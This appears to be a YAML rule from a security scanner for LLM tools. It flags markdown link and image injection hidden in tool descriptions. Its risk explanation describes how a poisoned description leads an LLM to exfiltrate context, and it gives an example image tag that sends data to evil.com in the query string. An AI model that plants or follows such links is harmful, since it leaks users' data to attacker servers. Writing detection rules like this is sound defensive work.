title: Markdown Link Injection in Descriptions
category: tool_poisoning
severity: medium
description: >
  Detects hidden markdown links in tool descriptions that can trigger
  data exfiltration. Markdown image tags and links with encoded
  parameters can cause the LLM to request external URLs, leaking context
  data via query strings or path segments.
risk_explanation: >
  Markdown links in tool descriptions can exfiltrate data when the LLM
  renders or follows them. An image tag like
  ![img](https://evil.com/?data=...) can encode sensitive context in the
  URL. The LLM may automatically resolve these links, sending user data
  to attacker-controlled servers without any visible indication to the
  user.
remediation: >
  Strip or neutralize markdown links and image references in tool
  descriptions. Implement URL validation for any links that must be
  retained. Block descriptions containing markdown image tags that
  reference external domains. Use content security policies to prevent
  automatic URL resolution from description content.
